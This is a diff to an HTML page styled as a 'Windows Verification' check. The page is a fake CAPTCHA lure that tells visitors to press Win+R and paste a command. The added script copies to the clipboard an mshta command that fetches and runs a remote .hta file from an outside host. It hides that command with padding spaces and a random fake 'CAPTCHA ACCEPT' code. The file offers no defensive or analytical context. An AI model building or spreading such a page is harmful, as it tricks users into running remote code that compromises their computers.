@@ -4,15 +4,73 @@
   <meta charset="UTF-8" />
   <title>Windows Verification</title>
   <style>
-    body { background:#111;color:#fff;font-family:sans-serif;text-align:center;padding:40px;}
-    .cmd {background:#222;padding:10px;margin:20px auto;border-radius:8px;display:inline-block;}
+    body {
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    .cmd {
+      background: #222;
+      padding: 10px;
+      margin: 20px auto;
+      border-radius: 8px;
+      display: inline-block;
+      font-family: monospace;
+      font-size: 0.95rem;
+      user-select: all;
+      max-width: 90%;
+      word-break: break-word;
+    }
+    .btn {
+      background: #5865F2;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      margin: 10px;
+    }
+    .btn:hover {
+      background: #4752c4;
+    }
   </style>
 </head>
 <body>
   <h2>Windows Verification</h2>
-  <p>Press <b>Win + R</b>, then paste and run the following command:</p>
-  <div class="cmd">mshta https://freegamecopier.onrender.com/verifyaccept.hta</div>
-  <p>This will display a popup if accepted.</p>
-  <button onclick="window.location.href='/'">Back to Home</button>
+  <p>Press <b>Win + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b>:</p>
+
+  <div class="cmd" id="cmdText"></div>
+  <button class="btn" onclick="copyCommand()">Copy</button>
+  <button class="btn" onclick="window.location.href='/'">Back to Home</button>
+
+  <script>
+    // Generate a fake verification code like X9K3-Z7R1
+    function generateCode() {
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      let code = "";
+      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
+      code += "-";
+      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
+      return code;
+    }
+
+    // Generate the full command with fake "CAPTCHA" message
+    const verificationCode = generateCode();
+    const spaces = " ".repeat(10); // Enough spaces to separate the actual mshta part
+    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${spaces}CAPTCHA ACCEPT - Code: ${verificationCode}`;
+
+    document.getElementById("cmdText").innerText = fullCommand;
+
+    function copyCommand() {
+      navigator.clipboard.writeText(fullCommand).then(() => {
+        alert("Copied to clipboard!");
+      }).catch(() => {
+        alert("Failed to copy. Try manually selecting the command.");
+      });
+    }
+  </script>
 </body>
 </html>
